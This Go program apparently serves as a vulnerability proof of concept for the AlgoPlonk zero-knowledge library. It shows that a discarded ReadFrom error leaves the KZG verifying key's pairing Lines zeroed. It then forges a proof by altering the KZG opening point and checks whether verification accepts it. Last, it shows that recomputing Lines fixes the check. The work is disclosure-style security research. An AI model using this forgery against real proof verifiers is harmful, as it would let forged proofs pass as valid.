// Command aplines demonstrates that the swallowed ReadFrom error in
// AlgoPlonk's setup/setup.go (noted in design doc 007 s4.12 as "empirically
// this does not break anything") DOES break something specific: it leaves
// kzg.VerifyingKey.Lines zeroed, which makes gnark's off-chain KZG pairing
// check vacuous.
//
// This runs entirely through AlgoPlonk's own public API and its own vendored
// PerpetualPowersOfTauBN254 setup -- no gnark-ptau, no custom SRS.
package main

import (
	"fmt"
	"os"

	ap "github.com/giuliop/algoplonk"
	"github.com/giuliop/algoplonk/setup"

	"github.com/consensys/gnark-crypto/ecc"
	bn254 "github.com/consensys/gnark-crypto/ecc/bn254"
	kzgbn "github.com/consensys/gnark-crypto/ecc/bn254/kzg"
	"github.com/consensys/gnark/backend/plonk"
	plonkbn254 "github.com/consensys/gnark/backend/plonk/bn254"
	"github.com/consensys/gnark/frontend"
)

type Cubic struct {
	X frontend.Variable
	Y frontend.Variable `gnark:",public"`
}

func (c *Cubic) Define(api frontend.API) error {
	x3 := api.Mul(c.X, c.X, c.X)
	api.AssertIsEqual(c.Y, api.Add(x3, c.X, 5))
	return nil
}

func countLines(l [2][2][len(bn254.LoopCounter)]bn254.LineEvaluationAff) int {
	var zero bn254.LineEvaluationAff
	n := 0
	for k := 0; k < 2; k++ {
		for j := 0; j < 2; j++ {
			for i := range l[k][j] {
				if l[k][j][i] != zero {
					n++
				}
			}
		}
	}
	return n
}

func main() {
	// (1) what error does Vk.ReadFrom actually return on the vendored vk.bin?
	vkPath := os.Args[1]
	b, err := os.ReadFile(vkPath)
	if err != nil {
		fmt.Println("ERROR:", err)
		os.Exit(1)
	}
	var vkTest kzgbn.VerifyingKey
	n, err := vkTest.ReadFrom(newReader(b))
	fmt.Printf("(1) vendored vk.bin = %d bytes\n", len(b))
	fmt.Printf("    kzg.VerifyingKey.ReadFrom -> read %d bytes, err = %v\n", n, err)
	fmt.Printf("    -> AlgoPlonk setup.go lines 190 / 174 DISCARD this error.\n")
	fmt.Printf("    Lines populated after the failed read: %d/264\n\n", countLines(vkTest.Lines))

	// (2) run AlgoPlonk's own documented production path
	fmt.Println("(2) ap.Compile(..., setup.PerpetualPowersOfTauBN254)")
	cc, err := ap.Compile(&Cubic{}, ecc.BN254, setup.PerpetualPowersOfTauBN254)
	if err != nil {
		fmt.Println("ERROR:", err)
		os.Exit(1)
	}
	vk := cc.Vk.(*plonkbn254.VerifyingKey)
	fmt.Printf("    resulting plonk VerifyingKey.Kzg.Lines: %d/264 non-zero\n\n",
		countLines(vk.Kzg.Lines))

	// (3) honest proof through AlgoPlonk
	vp, err := cc.Verify(&Cubic{X: 3, Y: 35})
	if err != nil {
		fmt.Println("    honest proof FAILED:", err)
		os.Exit(1)
	}
	fmt.Println("(3) honest proof via cc.Verify: OK")

	// (4) tamper ONLY the KZG opening proof -- catchable only by the pairing
	p := *vp.Proof.(*plonkbn254.Proof)
	var j bn254.G1Jac
	j.FromAffine(&p.BatchedProof.H)
	j.Double(&j)
	p.BatchedProof.H.FromJacobian(&j)

	w, _ := frontend.NewWitness(&Cubic{X: 3, Y: 35}, ecc.BN254.ScalarField())
	pub, _ := w.Public()
	err = plonk.Verify(&p, cc.Vk, pub)
	fmt.Printf("(4) proof with CORRUPTED KZG opening -> plonk.Verify err = %v\n", err)
	if err == nil {
		fmt.Println("    *** ACCEPTED. The off-chain KZG pairing check is VACUOUS. ***")
	} else {
		fmt.Println("    rejected (good)")
	}

	// (5) same, but with Lines repaired
	fmt.Println("\n(5) repairing Lines with bn254.PrecomputeLines and retrying:")
	vk.Kzg.Lines[0] = bn254.PrecomputeLines(vk.Kzg.G2[0])
	vk.Kzg.Lines[1] = bn254.PrecomputeLines(vk.Kzg.G2[1])
	err = plonk.Verify(&p, cc.Vk, pub)
	fmt.Printf("    corrupted-opening proof -> plonk.Verify err = %v\n", err)
	err2 := plonk.Verify(vp.Proof, cc.Vk, pub)
	fmt.Printf("    honest proof            -> plonk.Verify err = %v\n", err2)
}

type br struct {
	b []byte
	i int
}

func newReader(b []byte) *br { return &br{b, 0} }
func (r *br) Read(p []byte) (int, error) {
	if r.i >= len(r.b) {
		return 0, fmt.Errorf("EOF")
	}
	n := copy(p, r.b[r.i:])
	r.i += n
	return n, nil
}
